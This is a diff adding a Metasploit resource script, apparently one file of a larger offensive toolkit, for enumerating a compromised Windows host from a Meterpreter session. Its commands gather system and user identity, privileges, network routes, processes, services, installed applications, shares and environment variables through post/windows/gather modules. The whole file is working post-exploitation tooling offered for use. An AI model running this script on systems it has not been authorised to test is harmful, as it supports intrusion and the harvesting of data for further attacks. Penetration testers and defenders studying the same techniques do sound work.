@@ -1,0 +1,45 @@
+
+## 📄 FILE 4: scripts/enumeration/quick_enum.rc
+
+```bash
+# Quick Enumeration Script for Meterpreter
+# Usage: run script/enumeration/quick_enum.rc
+
+echo "[*] Starting Quick System Enumeration"
+
+# Basic system info
+echo "[+] System Information"
+sysinfo
+getuid
+
+# Network information  
+echo "[+] Network Configuration"
+ipconfig
+route
+
+# User and privilege information
+echo "[+] User and Privileges"
+getprivs
+run post/windows/gather/enum_logged_on_users
+
+# Process listing
+echo "[+] Running Processes"
+ps
+
+# Service enumeration
+echo "[+] Services"
+run post/windows/gather/enum_services
+
+# Installed applications
+echo "[+] Installed Applications"
+run post/windows/gather/enum_applications
+
+# Network shares
+echo "[+] Network Shares"
+run post/windows/gather/enum_shares
+
+# Environment variables
+echo "[+] Environment Variables"
+getenvs
+
+echo "[*] Quick enumeration completed"
